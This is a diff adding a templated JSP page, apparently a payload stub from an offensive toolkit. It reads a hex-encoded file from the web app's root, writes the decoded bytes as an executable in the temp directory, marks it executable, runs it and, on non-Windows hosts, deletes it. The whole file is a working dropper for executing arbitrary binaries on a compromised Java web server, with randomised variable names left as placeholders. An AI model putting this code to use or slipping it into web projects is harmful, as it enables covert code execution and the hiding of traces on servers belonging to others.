@@ -1,0 +1,51 @@
+<%%@ page import="java.io.*" %%>
+<%%
+	String %{var_hexpath} = application.getRealPath("/") + "/%{var_hexfile}.txt";
+	String %{var_exepath} = System.getProperty("java.io.tmpdir") + "/%{var_exe}";
+	String %{var_data} = "";
+
+	if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
+	{
+		%{var_exepath} = %{var_exepath}.concat(".exe");
+	}
+
+	FileInputStream %{var_inputstream} = new FileInputStream(%{var_hexpath});
+	FileOutputStream %{var_outputstream} = new FileOutputStream(%{var_exepath});
+
+	int %{var_numbytes} = %{var_inputstream}.available();
+	byte %{var_bytearray}[] = new byte[%{var_numbytes}];
+	%{var_inputstream}.read(%{var_bytearray});
+	%{var_inputstream}.close();
+	byte[] %{var_bytes} = new byte[%{var_numbytes}/2];
+	for (int %{var_counter} = 0; %{var_counter} < %{var_numbytes}; %{var_counter} += 2)
+	{
+		char %{var_char1} = (char) %{var_bytearray}[%{var_counter}];
+		char %{var_char2} = (char) %{var_bytearray}[%{var_counter} + 1];
+		int %{var_comb} = Character.digit(%{var_char1}, 16) & 0xff;
+		%{var_comb} <<= 4;
+		%{var_comb} += Character.digit(%{var_char2}, 16) & 0xff;
+		%{var_bytes}[%{var_counter}/2] = (byte)%{var_comb};
+	}
+
+	%{var_outputstream}.write(%{var_bytes});
+	%{var_outputstream}.close();
+
+	if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
+		String[] %{var_fperm} = new String[3];
+		%{var_fperm}[0] = "chmod";
+		%{var_fperm}[1] = "+x";
+		%{var_fperm}[2] = %{var_exepath};
+		Process %{var_proc} = Runtime.getRuntime().exec(%{var_fperm});
+		if (%{var_proc}.waitFor() == 0) {
+			%{var_proc} = Runtime.getRuntime().exec(%{var_exepath});
+		}
+
+		File %{var_fdel} = new File(%{var_exepath}); %{var_fdel}.delete();
+	}
+	else
+	{
+		String[] %{var_exepatharray} = new String[1];
+		%{var_exepatharray}[0] = %{var_exepath};
+		Process %{var_proc} = Runtime.getRuntime().exec(%{var_exepatharray});
+	}
+%%>
